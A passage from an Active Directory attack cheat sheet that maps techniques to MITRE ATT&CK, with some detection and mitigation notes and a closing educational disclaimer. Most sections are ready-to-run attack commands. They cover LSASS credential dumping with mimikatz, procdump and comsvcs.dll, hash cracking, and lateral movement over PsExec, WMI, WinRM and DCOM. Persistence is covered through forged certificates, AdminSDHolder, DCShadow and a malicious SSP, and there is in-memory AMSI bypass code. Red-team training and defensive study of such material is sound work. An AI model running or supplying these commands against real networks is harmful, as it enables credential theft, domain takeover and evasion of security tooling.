# Crack with hashcat mode 19900 (AS-REQ)
hashcat -m 19900 hashes.txt wordlist.txt
```

---

### Offline Domain Password Spray
**MITRE ATT&CK**: T1110.003

**Description**: Use extracted NTDS hashes to identify weak passwords offline.

**Attack Execution**:
```bash
# Extract NTLM hashes
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL -outputfile hashes

# Crack with hashcat
hashcat -m 1000 hashes.ntds wordlist.txt -r rules/best64.rule

# Statistics
hashcat -m 1000 hashes.ntds wordlist.txt --show | wc -l

# Find accounts with same password
sort hashes.ntds | uniq -f1 -d
```

---

### Credential Dumping via LSASS
**MITRE ATT&CK**: T1003.001

**Description**: Extract credentials from LSASS process memory.

**Attack Execution**:

**Windows (Mimikatz)**:
```powershell
# Standard sekurlsa
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Dump all credentials
mimikatz # sekurlsa::msv
mimikatz # sekurlsa::kerberos
mimikatz # sekurlsa::wdigest
mimikatz # sekurlsa::tspkg
mimikatz # sekurlsa::credman

# Export tickets
mimikatz # sekurlsa::tickets /export

# Dump LSASS to file first (evade AV)
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

**Windows (Task Manager/Procdump)**:
```powershell
# Procdump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Parse offline
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

# Pypykatz (Python)
pypykatz lsa minidump lsass.dmp
```

**Windows (Comsvcs.dll)**:
```powershell
# Native dump method
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full
```

**Linux (CrackMapExec)**:
```bash
# Dump credentials
crackmapexec smb 10.10.10.50 -u Administrator -H NTLMHASH --lsa

# Dump SAM
crackmapexec smb 10.10.10.50 -u Administrator -H NTLMHASH --sam

# Dump NTDS
crackmapexec smb 10.10.10.10 -u Administrator -H NTLMHASH --ntds
```

**Detection Indicators**:
- Event ID 4656: Handle to lsass.exe
- Event ID 4663: Access to lsass.exe process
- Event ID 10: Process accessed (Sysmon)
- Suspicious process accessing lsass.exe
- Credential dumping tool signatures
- MiniDump file creation

**Mitigation**:
- Credential Guard
- LSA Protection (RunAsPPL)
- WDigest disabled
- Antivirus with behavioral detection
- Monitor lsass.exe access
- Restrict debug privileges

---

## Lateral Movement

### PsExec
**MITRE ATT&CK**: T1569.002

**Attack Execution**:
```bash
# Impacket
impacket-psexec corp.local/Administrator:password@target.corp.local

# With hash
impacket-psexec -hashes :NTLMHASH corp.local/Administrator@target.corp.local

# CrackMapExec
crackmapexec smb target.corp.local -u Administrator -p password -x "whoami"
```

---

### WMI Execution
**MITRE ATT&CK**: T1047

**Attack Execution**:
```powershell
# Windows
wmic /node:target.corp.local /user:Administrator /password:password process call create "cmd.exe /c whoami"

# PowerShell
Invoke-WmiMethod -ComputerName target.corp.local -Credential $cred -Class Win32_Process -Name Create -ArgumentList "powershell.exe"

# Linux (Impacket)
impacket-wmiexec corp.local/Administrator:password@target.corp.local
```

---

### WinRM / PSRemoting
**MITRE ATT&CK**: T1021.006

**Attack Execution**:
```powershell
# Enter-PSSession
Enter-PSSession -ComputerName target.corp.local -Credential corp\Administrator

# Invoke-Command
Invoke-Command -ComputerName target.corp.local -ScriptBlock {whoami} -Credential $cred

# Linux (evil-winrm)
evil-winrm -i target.corp.local -u Administrator -p password

# With hash
evil-winrm -i target.corp.local -u Administrator -H NTLMHASH
```

---

### DCOM Execution
**MITRE ATT&CK**: T1021.003

**Attack Execution**:
```powershell
# MMC20.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target.corp.local"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","Minimized")

# ShellWindows
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","target.corp.local"))

# Linux (Impacket)
impacket-dcomexec corp.local/Administrator:password@target.corp.local "whoami"
```

---

### RDP Hijacking
**MITRE ATT&CK**: T1563.002

**Attack Execution**:
```powershell
# Enumerate sessions
query user

# Hijack session (requires SYSTEM)
tscon <SESSION_ID> /dest:<CURRENT_SESSION>

# With password (without SYSTEM)
tscon <SESSION_ID> /dest:<CURRENT_SESSION> /password:<PASSWORD>
```

---

## Persistence Techniques

### Golden Certificate
**MITRE ATT&CK**: T1649

**Description**: Forge certificates using stolen CA private key.

**Prerequisites**:
- CA private key and certificate
- Domain Admin on CA server

**Attack Execution**:
```powershell
# Export CA certificate and key (on CA server)
mimikatz # crypto::capi
mimikatz # crypto::cng
mimikatz # crypto::certificates /systemstore:local_machine /export

# Forge certificate for any user
.\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword password --Subject "CN=Administrator" --SubjectAltName "administrator@corp.local" --NewCertPath admin.pfx --NewCertPassword password

# Use forged certificate
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:password /getcredentials /ptt
```

**Detection**:
- Monitor CA private key access
- Certificate issuance from unexpected sources
- Certificates without proper issuance logs

**Mitigation**:
- Hardware Security Module (HSM) for CA keys
- Monitor CA key file access
- Certificate transparency logging

---

### AdminSDHolder / SDProp
**MITRE ATT&CK**: T1098

**Description**: Modify AdminSDHolder to maintain persistence on privileged accounts.

**Attack Execution**:
```powershell
# Add ACL to AdminSDHolder (runs every 60 minutes via SDProp)
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -PrincipalIdentity attacker -Rights All

# Force SDProp propagation
Invoke-SDPropagator

# After 60 minutes (or forced), attacker will have rights over all protected groups
```

**Detection**:
- Event ID 5136: AdminSDHolder object modified
- SDProp execution monitoring
- Unusual ACLs on AdminSDHolder

---

### DCShadow
**MITRE ATT&CK**: T1207

**Description**: Register rogue Domain Controller to push changes to AD.

**Prerequisites**:
- Domain Admin or equivalent
- Ability to register DCs

**Attack Execution**:
```powershell
# Setup DCShadow (requires two Mimikatz instances)
# Instance 1 (as DA):
mimikatz # !+
mimikatz # !processtoken
mimikatz # lsadump::dcshadow /object:targetuser /attribute:primaryGroupID /value:512

# Instance 2 (as SYSTEM):
mimikatz # lsadump::dcshadow /push
```

**Detection**:
- Unusual DC registrations
- Event ID 4742: Computer account modified (DC registration)
- Replication from unexpected sources

---

### Skeleton Key (Revisited)
See Kerberos Attacks section above.

---

### DSRM Abuse
**MITRE ATT&CK**: T1003

**Description**: Use Directory Services Restore Mode password to access DC.

**Attack Execution**:
```powershell
# Enable DSRM logon
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2

# Extract DSRM hash
mimikatz # token::elevate
mimikatz # lsadump::sam

# Pass-the-Hash with DSRM account
mimikatz # sekurlsa::pth /domain:DC01 /user:Administrator /ntlm:DSRMHASH
```

---

### Custom SSP (Security Support Provider)
**MITRE ATT&CK**: T1547.005

**Description**: Install malicious SSP to capture credentials.

**Attack Execution**:
```powershell
# Install mimilib.dll as SSP
mimikatz # misc::memssp

# Or persistent installation
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | Select -ExpandProperty 'Security Packages'
$packages += "mimilib"
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages

# Copy mimilib.dll to C:\Windows\System32\
copy mimilib.dll C:\Windows\System32\

# Credentials logged to C:\Windows\System32\mimilsa.log
```

**Detection**:
- New SSP registration
- Registry modifications to LSA
- New DLLs in System32 loaded by lsass.exe

---

## Tools Reference

### Rubeus
**Purpose**: Kerberos abuse toolkit
**Key Functions**:
- Kerberoasting
- AS-REP Roasting
- Golden/Silver ticket creation
- S4U abuse
- Ticket extraction and manipulation

**Download**: https://github.com/GhostPack/Rubeus

---

### Mimikatz
**Purpose**: Credential dumping and manipulation
**Key Functions**:
- LSASS credential extraction
- DCSync
- Golden/Silver tickets
- Skeleton key
- Kerberos ticket manipulation

**Download**: https://github.com/gentilkiwi/mimikatz

---

### Impacket
**Purpose**: Network protocol implementations in Python
**Key Tools**:
- secretsdump: DCSync, NTDS extraction
- GetUserSPNs: Kerberoasting
- GetNPUsers: AS-REP roasting
- psexec/wmiexec/smbexec: Remote execution
- ntlmrelayx: NTLM relay attacks
- getST: Constrained delegation abuse

**Download**: https://github.com/fortra/impacket

---

### CrackMapExec (NetExec)
**Purpose**: Network assessment and exploitation
**Key Functions**:
- Credential spraying
- Hash dumping (SAM, LSA, NTDS)
- Command execution
- Module-based attacks
- Network enumeration

**Download**: https://github.com/Pennyw0rth/NetExec

---

### BloodHound
**Purpose**: AD attack path visualization
**Key Functions**:
- ACL abuse identification
- Privilege escalation paths
- Trust relationships
- Session enumeration
- Shortest path to DA

**Download**: https://github.com/BloodHoundAD/BloodHound

---

### Certify / Certipy
**Purpose**: AD CS enumeration and exploitation
**Key Functions**:
- Certificate template enumeration
- ESC1-ESC13 exploitation
- Certificate theft
- CA configuration analysis

**Download**:
- Certify: https://github.com/GhostPack/Certify
- Certipy: https://github.com/ly4k/Certipy

---

### PowerView
**Purpose**: AD enumeration and exploitation (PowerShell)
**Key Functions**:
- Domain enumeration
- ACL analysis
- Trust mapping
- GPO abuse
- User/group enumeration

**Download**: https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon

---

### Covenant / Empire
**Purpose**: Post-exploitation frameworks
**Key Functions**:
- C2 infrastructure
- Lateral movement
- Privilege escalation
- Persistence
- Evasion techniques

**Download**:
- Covenant: https://github.com/cobbr/Covenant
- Empire: https://github.com/BC-SECURITY/Empire

---

## Detection & Monitoring

### Key Event IDs

**Authentication Events**:
- 4624: Successful logon
- 4625: Failed logon
- 4768: Kerberos TGT request
- 4769: Kerberos TGS request
- 4771: Kerberos pre-auth failed
- 4776: Credential validation

**Account Management**:
- 4720: User account created
- 4722: User account enabled
- 4724: Password reset attempt
- 4728: Member added to security group
- 4732: Member added to local group
- 4738: User account changed
- 4740: User account locked
- 4767: User account unlocked

**Privilege Use**:
- 4672: Special privileges assigned to logon
- 4673: Sensitive privilege use
- 4674: Privileged operation attempt

**Object Access**:
- 4662: Operation performed on AD object
- 4663: Attempt to access object
- 5136: Directory service object modified

**System Events**:
- 4697: Service installed
- 7045: Service installed (System log)
- 4688: Process creation (with command line)
- 4689: Process terminated

**AD CS Events**:
- 4886: Certificate Services received request
- 4887: Certificate Services approved request
- 4888: Certificate Services denied request

---

### SIEM Queries (Splunk Examples)

**Kerberoasting Detection**:
```
index=windows EventCode=4769 TicketEncryptionType=0x17 ServiceName!=*$
| stats count by ServiceName,TargetUserName,IpAddress
| where count > 5
```

**DCSync Detection**:
```
index=windows EventCode=4662 AccessMask=0x100
(Properties=*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2* OR Properties=*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*)
SubjectUserName!=*DC*
| table _time,SubjectUserName,ObjectName,IpAddress
```

**Golden Ticket Detection**:
```
index=windows EventCode=4624 LogonType=3 TargetUserName!=*$
| eval TicketLifetime=tonumber(TicketValidFor)
| where TicketLifetime > 600
| table _time,TargetUserName,IpAddress,TicketLifetime
```

**Password Spraying**:
```
index=windows EventCode=4625
| stats count dc(TargetUserName) as unique_users by IpAddress
| where unique_users > 10 AND count > 20
```

---

### Mitigation Summary

1. **Authentication**:
   - Disable NTLM where possible
   - Disable RC4 encryption
   - Enable AES for Kerberos
   - Implement MFA

2. **Credentials**:
   - Use gMSA for service accounts
   - Implement LAPS
   - Enable Credential Guard
   - Strong password policies

3. **Privileges**:
   - Tiered administration model
   - Protected Users security group
   - "Account is sensitive" flag
   - Just-in-time admin access

4. **Monitoring**:
   - Enable advanced auditing
   - SIEM with AD-specific rules
   - Deploy honeypot accounts
   - Monitor replication rights

5. **Network**:
   - SMB signing enforcement
   - LDAP signing and channel binding
   - Network segmentation
   - Disable unnecessary protocols

6. **AD CS**:
   - Regular template audits
   - Enable EPA on web enrollment
   - Remove deprecated templates
   - Monitor certificate issuance

7. **Delegation**:
   - Minimize unconstrained delegation
   - Regular delegation audits
   - Set MachineAccountQuota to 0
   - Monitor RBCD configurations

---

## Advanced Evasion Techniques (2024-2025)

### EDR Evasion

**Direct Syscalls**:
- Bypass userland hooks by invoking syscalls directly
- Tools: SysWhispers2, SysWhispers3, InlineWhispers

**PPID Spoofing**:
- Spoof parent process to evade behavioral detection
- Appears as legitimate process chain

**Process Injection Variations**:
- Early Bird APC injection
- Process Doppelgänging
- Process Herpaderping
- Module Stomping

**AMSI Bypass**:
```powershell
# Patch AMSI in memory
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternative memory patch
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, $mem)
```

### Living Off the Land Binaries (LOLBins)

**Credential Access**:
- RunDLL32 + comsvcs.dll for LSASS dump
- certutil for file transfer and encoding
- bitsadmin for download and persistence

**Execution**:
- mshta for HTML application execution
- regsvr32 for scriptlet execution
- rundll32 for DLL execution

### Obfuscation

**PowerShell**:
- Invoke-Obfuscation framework
- String concatenation and encoding
- Variable name randomization
- Command reordering

**Binary**:
- Packing (UPX, custom packers)
- Code signing with stolen/fake certificates
- .NET obfuscation (ConfuserEx, Obfuscar)

---

## CVE References

- **CVE-2020-17049**: Bronze Bit - Kerberos delegation bypass
- **CVE-2021-36942**: PetitPotam - NTLM relay via EFS
- **CVE-2021-42278/42287**: sAMAccountName spoofing (noPac)
- **CVE-2022-26923**: AD CS privilege escalation
- **MS14-068**: Kerberos PAC validation bypass
- **CVE-2019-1040**: NTLM MIC bypass
- **ZeroLogon (CVE-2020-1472)**: Netlogon elevation of privilege

---

## Additional Resources

**Books**:
- "Active Directory Security: Attacking and Defending AD" - Sean Metcalf
- "Operator Handbook: Active Directory" - Joshua Picolet
- "Pentesting Active Directory" - Riccardo Ancarani

**Courses**:
- CRTP: Certified Red Team Professional (Pentester Academy)
- CRTE: Certified Red Team Expert (Pentester Academy)
- GXPN: GIAC Exploit Researcher and Advanced Penetration Tester

**Websites & Blogs**:
- adsecurity.org (Sean Metcalf)
- harmj0y.net (Will Schroeder - PowerView author)
- blog.harmj0y.net/redteaming
- ired.team (AD attack techniques)
- pentestlab.blog (AD exploitation)

**Tools Collections**:
- https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
- https://wadcoms.github.io/ (Interactive AD cheat sheet)

---

**Document Version**: 1.0
**Last Updated**: 2025-01-09
**Author**: Zemarkhos
**Classification**: Educational/Research Purpose Only

**Legal Disclaimer**: This document is for authorized security testing and educational purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before conducting security assessments.
